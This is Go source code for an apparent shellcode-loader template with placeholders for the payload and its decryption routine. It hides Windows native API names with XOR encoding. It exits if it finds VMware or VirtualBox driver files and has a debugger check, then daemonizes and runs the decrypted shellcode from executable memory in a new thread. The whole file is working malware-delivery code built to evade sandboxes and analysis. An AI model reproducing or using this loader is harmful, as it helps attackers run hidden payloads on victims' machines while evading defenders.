package main

import (
	"github.com/zh-five/xdaemon"
	"os"
	"syscall"
	"time"
	"unsafe"
	{{header}}
)

{{decryption}}

func XOR(shellcode []byte,key byte)[]byte{
	for i:=0;i< len(shellcode);i++{
		shellcode[i] ^= key
	}
	return shellcode
}



var(
	ntdll = syscall.NewLazyDLL(string(XOR([]byte{82,72,88,80,80,18,88,80,80},60)))
	procNTAllocateVirtualMemory = ntdll.NewProc(string(XOR([]byte{122,64,117,88,88,91,87,85,64,81,98,93,70,64,65,85,88,121,81,89,91,70,77},52)))
	procNTWriteVirtualMemory = ntdll.NewProc(string(XOR([]byte{96 ,90, 121 ,92 ,71 ,90 ,75 ,120 ,71 ,92 ,90 ,91 ,79 ,66 ,99 ,75 ,67 ,65 ,92 ,87},46)))
	procNTCreateThreadEx = ntdll.NewProc(string(XOR([]byte{34, 24, 47 ,30 ,9 ,13 ,24 ,9 ,56 ,4 ,30, 9 ,13, 8 ,41 ,20},108)))
)

func NTA(hProcess uintptr, lpAddress *uintptr, zerobits uintptr, dwSize *uint32, flAllocationType uint32, flProtect uint32){
	_,_,_ = syscall.Syscall6(procNTAllocateVirtualMemory.Addr(), 6, uintptr(hProcess), uintptr(unsafe.Pointer(lpAddress)), uintptr(zerobits), uintptr(unsafe.Pointer(dwSize)), uintptr(flAllocationType), uintptr(flProtect))
	return
}

func NTW(hProcess uintptr, lpBaseAddress uintptr, lpBuffer *byte, nSize uintptr, lpNumberOfBytesWritten *uintptr){
	_,_,_ = syscall.Syscall6(procNTWriteVirtualMemory.Addr(), 5, uintptr(hProcess), uintptr(lpBaseAddress), uintptr(unsafe.Pointer(lpBuffer)), uintptr(nSize), uintptr(unsafe.Pointer(lpNumberOfBytesWritten)), 0)

	return
}

func NTC(hThread *uintptr, desiredaccess uintptr, objattrib uintptr, processhandle uintptr, lpstartaddr uintptr, lpparam uintptr, createsuspended uintptr, zerobits uintptr, sizeofstack uintptr, sizeofstackreserve uintptr, lpbytesbuffer uintptr){
	_,_,_ = syscall.Syscall12(procNTCreateThreadEx.Addr(), 11, uintptr(unsafe.Pointer(hThread)), uintptr(desiredaccess), uintptr(objattrib), uintptr(processhandle), uintptr(lpstartaddr), uintptr(lpparam), uintptr(createsuspended), uintptr(zerobits), uintptr(sizeofstack), uintptr(sizeofstackreserve), uintptr(lpbytesbuffer), 0)
	return
}

// 反调试

func Debugger(param interface{}) (code int) {
	var kernel32, _ = syscall.LoadLibrary("kernel32.dll")
	var IsDebuggerPresent, _ = syscall.GetProcAddress(kernel32, "IsDebuggerPresent")
	var nargs uintptr = 0

	if debuggerPresent, _, err := syscall.Syscall(uintptr(IsDebuggerPresent), nargs, 0, 0, 0); err != 0 {
	} else {
		if debuggerPresent != 0 {
			return 0
		}
	}
	return -1
}


// sandbox

func PathExists(path string) (bool, error) { //判断文件是否存在
	_, err := os.Stat(path)
	if err == nil {
		return true, nil
	}
	if os.IsNotExist(err) {
		return false, nil
	}
	return false, err
}
func sandBox(path string) { //判断虚拟机关键文件是否存在
	b, _ := PathExists(path)
	if b {
		os.Exit(1) //如果是虚拟机就退出当前进程
	}
}
func checksand() {
	sandBox("C:\\windows\\System32\\Drivers\\Vmmouse.sys")
	sandBox("C:\\windows\\System32\\Drivers\\vmtray.dll")
	sandBox("C:\\windows\\System32\\Drivers\\VMToolsHook.dll")
	sandBox("C:\\windows\\System32\\Drivers\\vmmousever.dll")
	sandBox("C:\\windows\\System32\\Drivers\\vmhgfs.dll")
	sandBox("C:\\windows\\System32\\Drivers\\vmGuestLib.dll")
	sandBox("C:\\windows\\System32\\Drivers\\VBoxMouse.sys")
	sandBox("C:\\windows\\System32\\Drivers\\VBoxGuest.sys")
	sandBox("C:\\windows\\System32\\Drivers\\VBoxSF.sys")
	sandBox("C:\\windows\\System32\\Drivers\\VBoxVideo.sys")
	sandBox("C:\\windows\\System32\\vboxdisp.dll")
	sandBox("C:\\windows\\System32\\vboxhook.dll")
	sandBox("C:\\windows\\System32\\vboxoglerrorspu.dll")
	sandBox("C:\\windows\\System32\\vboxoglpassthroughspu.dll")
	sandBox("C:\\windows\\System32\\vboxservice.exe")
	sandBox("C:\\windows\\System32\\vboxtray.exe")
	sandBox("C:\\windows\\System32\\VBoxControl.exe")
}


func main(){
	Debugger(nil) //no debugger
	checksand() // sandbox
	time.Sleep(10 *time.Second)
	_ ,_ = xdaemon.Background("", true) // daemon
	
	shellcode := Crypto("{{shellcode}}")

		regionsize := uint32(len(shellcode)) //获取shellcode长度
		var baseA uintptr
		// 申请一个读写权限的内存baseA
		NTA(uintptr(0xffffffffffffffff),
			&baseA,
			0,
			&regionsize,
			uint32(uintptr(0x00001000)|uintptr(0x00002000)),
			syscall.PAGE_EXECUTE_READWRITE,
		)
		var written uintptr
		// 将shellcode写入内存baseA
		NTW(uintptr(0xffffffffffffffff), baseA, &shellcode[0], uintptr(len(shellcode)), &written)


		var hosthread uintptr
		NTC(
			&hosthread,
			0x1FFFFF,
			0,
			uintptr(0xffffffffffffffff),
			baseA,
			0,
			uintptr(0),
			0,
			0,
			0,
			0,
		)
	_ ,_ = syscall.WaitForSingleObject(syscall.Handle(hosthread),0xffffffff)
}
